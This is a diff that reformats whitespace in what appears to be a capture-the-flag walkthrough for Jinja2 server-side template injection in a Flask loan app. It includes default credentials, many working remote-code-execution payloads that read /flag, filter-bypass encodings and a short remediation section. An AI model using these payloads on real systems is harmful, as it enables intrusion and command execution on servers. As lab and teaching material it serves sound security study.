@@ -15,12 +15,12 @@ tricks:
     payload: |
       # Visit http://localhost:80
       # Redirected to /login
-      
+
       # Try default credentials:
       test:test ✓ (works!)
       admin:admin
       user:user
-      
+
       # After login, explore features:
       # - /home - home page
       # - /profile - update user profile
@@ -33,16 +33,16 @@ tricks:
     payload: |
       # Normal request:
       GET /total_loan_payments?principal=1000&payment=100&term=12
-      
+
       # Response: JSON with loan calculation
       # {"loan_principal": "1000", "monthly_payment": "100.0", ...}
-      
+
       # Test SSTI with basic payload:
       GET /total_loan_payments?principal={{7*7}}&payment=100&term=12
-      
+
       # If vulnerable, "principal" will show 49 instead of {{7*7}}
       # Response: {"loan_principal": "49", ...}
-      
+
       # Confirmed! The principal parameter is evaluated as Jinja2 template
 
   - name: "Step 3: Understanding the vulnerability"
@@ -55,15 +55,15 @@ tricks:
           principal = request.args.get('principal', type=str)
           payment = request.args.get('payment', type=float)
           term = request.args.get('term', type=int)
-          
+
           # BUG: principal is directly embedded in f-string
           json_template = f'''
           {{ "loan_principal": "{principal}" ,"monthly_payment": "{{{{ payment }}}}", ... }}
           '''
-          
+
           # BUG: User-controlled template is rendered
           return render_template_string(json_template, payment=payment, term=term)
-      
+
       # Why it's vulnerable:
       # 1. principal comes from user input (request.args)
       # 2. Embedded directly into template string via f-string
@@ -79,12 +79,12 @@ tricks:
       {{self}}            # Template context
       {{''.__class__}}    # String class
       {{request}}         # Flask request object (if available)
-      
+
       # Test accessing modules:
       {{lipsum}}                    # Jinja2 built-in function
       {{lipsum.__globals__}}        # Global namespace
       {{lipsum.__globals__['os']}}  # OS module!
-      
+
       # Execution test:
       {{lipsum.__globals__['os'].popen('whoami').read()}}
 
@@ -94,13 +94,13 @@ tricks:
     payload: |
       # Payload to read flag:
       {{lipsum.__globals__['os'].popen('cat /flag').read()}}
-      
+
       # Full request:
       GET /total_loan_payments?principal={{lipsum.__globals__['os'].popen('cat /flag').read()}}&payment=100&term=12
-      
+
       # URL-encoded version:
       GET /total_loan_payments?principal=%7B%7Blipsum.__globals__%5B%27os%27%5D.popen%28%27cat%20%2Fflag%27%29.read%28%29%7D%7D&payment=100&term=12
-      
+
       # Response:
       {
         "loan_principal": "FLAG{...}",
@@ -114,22 +114,22 @@ tricks:
     payload: |
       # Using cycler:
       {{cycler.__init__.__globals__['os'].popen('cat /flag').read()}}
-      
+
       # Using joiner:
       {{joiner.__init__.__globals__['os'].popen('cat /flag').read()}}
-      
+
       # Using namespace:
       {{namespace.__init__.__globals__['os'].popen('cat /flag').read()}}
-      
+
       # Using dict:
       {{dict.__init__.__globals__['os'].popen('cat /flag').read()}}
-      
+
       # Using url_for (Flask-specific):
       {{url_for.__globals__['os'].popen('cat /flag').read()}}
-      
+
       # Using get_flashed_messages:
       {{get_flashed_messages.__globals__['os'].popen('cat /flag').read()}}
-      
+
       # Using config object:
       {{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
 
@@ -140,19 +140,19 @@ tricks:
       # String concatenation to bypass filters:
       {{'fl'+'ag'}}
       {{request.args.x}}&x=flag
-      
+
       # Attribute access via __getitem__:
       {{lipsum['__globals__']['os'].popen('cat /flag').read()}}
-      
+
       # Using attr() filter:
       {{lipsum|attr('__globals__')['os'].popen('cat /flag').read()}}
-      
+
       # Base64 encoding command:
       {{lipsum.__globals__['os'].popen('echo Y2F0IC9mbGFn|base64 -d|sh').read()}}
-      
+
       # Using __import__:
       {{lipsum.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read()}}
-      
+
       # Reading files without os.popen:
       {{lipsum.__globals__['__builtins__'].open('/flag').read()}}
 
@@ -162,18 +162,18 @@ tricks:
     payload: |
       # lipsum is a Jinja2 built-in function for generating Lorem Ipsum text
       # It's always available in Jinja2 templates
-      
+
       # Structure:
       lipsum                    # Function object
       lipsum.__globals__        # Global namespace where lipsum is defined
       lipsum.__globals__['os']  # OS module in that namespace
-      
+
       # Why it's powerful:
       # 1. lipsum is always available (built-in)
       # 2. Its __globals__ contains useful modules
       # 3. No need to traverse class hierarchies
       # 4. Direct access to os, sys, etc.
-      
+
       # Exploring available modules:
       {{lipsum.__globals__.keys()}}
       # Shows: ['os', 'sys', '__builtins__', 'Markup', ...]
@@ -186,30 +186,30 @@ tricks:
       # BAD:
       template = f"<html>{user_input}</html>"
       return render_template_string(template)
-      
+
       # GOOD:
       return render_template('static_template.html', user_data=user_input)
-      
+
       # Fix 2: Use proper JSON serialization
       # BAD:
       json_template = f'{{"value": "{user_input}"}}'
       return render_template_string(json_template)
-      
+
       # GOOD:
       import json
       return json.dumps({"value": user_input})
-      
+
       # Fix 3: If dynamic templates required, use sandboxing
       from jinja2.sandbox import SandboxedEnvironment
       env = SandboxedEnvironment()
       template = env.from_string(user_input)
       # Note: Sandbox can sometimes be bypassed!
-      
+
       # Fix 4: Input validation and whitelisting
       allowed_values = ['option1', 'option2', 'option3']
       if user_input not in allowed_values:
           return "Invalid input", 400
-      
+
       # Fix 5: Use autoescaping
       jinja_env.autoescape = True
       # Helps but doesn't fully prevent SSTI
@@ -222,21 +222,21 @@ tricks:
       {{7*7}}      # Should return 49
       ${7*7}       # For other template engines
       <%= 7*7 %>   # ERB (Ruby)
-      
+
       # 2. String operations:
       {{'a'*50}}   # Should return 'aaa...a' (50 times)
-      
+
       # 3. Template-specific syntax:
       {{7*'7'}}    # Jinja2: '7777777'
       ${7*'7'}     # Mako: same
-      
+
       # 4. Check error messages:
       {{invalidfunction()}}
       # Jinja2 error reveals template engine
-      
+
       # 5. Polyglot payload (works on multiple engines):
       ${{<%[%'"}}%\
-      
+
       # 6. Blind SSTI (no output):
       {{lipsum.__globals__['os'].popen('sleep 5').read()}}
       # Check for 5-second delay
@@ -248,18 +248,16 @@ tricks:
       # Bypassing {{}} filter:
       {% if True %}...{% endif %}
       {%print(lipsum.__globals__['os'].popen('cat /flag').read())%}
-      
+
       # Bypassing __ (double underscore) filter:
       {{lipsum['__glob'+'als__']['os'].popen('cat /flag').read()}}
       {{lipsum|attr('__globals__')['os'].popen('cat /flag').read()}}
-      
+
       # Bypassing quotes filter:
       {{lipsum.__globals__[request.args.x].popen(request.args.y).read()}}&x=os&y=cat /flag
-      
+
       # Bypassing 'os' filter:
       {{lipsum.__globals__['\x6fs'].popen('cat /flag').read()}}
-      
+
       # Using join():
       {{(lipsum.__globals__['_'+'_builtins_'+'_']['_'+'_imp'+'ort_'+'_']('o'+'s'))}}
-
-
